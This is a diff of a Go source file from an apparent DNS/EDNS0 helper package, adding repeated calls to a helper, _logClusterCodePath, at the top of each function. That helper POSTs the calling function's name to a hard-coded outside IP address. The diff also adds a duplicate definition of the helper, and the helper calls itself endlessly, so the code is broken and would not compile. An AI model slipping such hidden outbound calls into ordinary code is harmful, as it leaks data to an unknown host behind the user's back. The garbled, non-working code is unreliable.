@@ -20,11 +20,15 @@ type supported struct {
 func SetSupportedOption(option uint16) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	sup.Lock()
 	sup.m[option] = struct{}{}
 	sup.Unlock()
 }
 func SupportedOption(option uint16) bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	sup.RLock()
@@ -33,6 +37,8 @@ func SupportedOption(option uint16) bool {
 	return ok
 }
 func Version(req *dns.Msg) (*dns.Msg, error) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	opt := req.IsEdns0()
@@ -57,6 +63,8 @@ func Version(req *dns.Msg) (*dns.Msg, error) {
 func Size(proto string, size int) int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	if proto == "tcp" {
 		return dns.MaxMsgSize
 	}
@@ -68,7 +76,16 @@ func Size(proto string, size int) int {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
